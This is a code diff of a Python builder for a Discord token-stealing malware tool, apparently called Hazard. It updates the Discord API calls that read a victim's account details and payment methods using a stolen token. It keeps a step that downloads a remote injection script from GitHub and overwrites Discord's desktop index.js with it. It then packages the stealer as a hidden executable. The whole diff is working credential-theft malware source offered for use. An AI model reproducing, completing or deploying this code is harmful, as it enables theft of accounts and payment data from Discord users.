@@ -8,9 +8,6 @@ import Hazard
 
 from colorama import Fore
 
-from util.plugins.common import clear, print_slow, getheaders, THIS_VERSION
-
-
 def TokenGrabber(WebHook, fileName):
     password_stealer = False
     try:
@@ -95,7 +92,7 @@ def getheaders(token=None, content_type="application/json"):
 
 def getuserdata(token):
     try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+        return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=getheaders(token))).read().decode())
     except:
         pass
 
@@ -142,7 +139,7 @@ def getavatar(uid, aid):
 
 def has_payment_methods(token):
     try:
-        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
     except:
         pass
 
@@ -257,7 +254,10 @@ def HazardStealer():
             if (name.__contains__("discord_desktop_core-")):
                 try:
                     directory_list = os.path.join(root, name+"\\\\discord_desktop_core\\\\index.js")
-                    os.mkdir(os.path.join(root, name+"\\\\discord_desktop_core\\\\Hazard"))
+                    try:
+                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
+                    except FileExistsError:
+                        pass
                     f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
                     index_content = f.read()
                     with open(directory_list, 'wb') as index_file:
@@ -287,7 +287,7 @@ if __name__ == "__main__":
         #     '--log-level=WARN',
         #     f'-n {fileName}',
         # ])
-        os.system(f"pyinstaller {fileName}.py --onefile --noconsole --log-level=WARN -i NONE -n {fileName}")
+        os.system(f"pyinstaller {fileName}.py --onefile --noconsole --log-level=INFO -i NONE -n {fileName}")
         shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
         shutil.rmtree('build')
         shutil.rmtree('dist')
@@ -297,6 +297,14 @@ if __name__ == "__main__":
 
     except Exception as e:
         print(f"{Fore.RED}Error while making exe: {e}")
+        try:
+            shutil.rmtree('build')
+            shutil.rmtree('dist')
+            shutil.rmtree('__pycache__')
+            os.remove(f'{fileName}.spec')
+            os.remove(f'{fileName}.py')
+        except FileNotFoundError:
+            pass
     else:
         print(f"\n{Fore.GREEN}File created as {fileName}.exe\n")
     input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue . . .  {Fore.LIGHTRED_EX}')
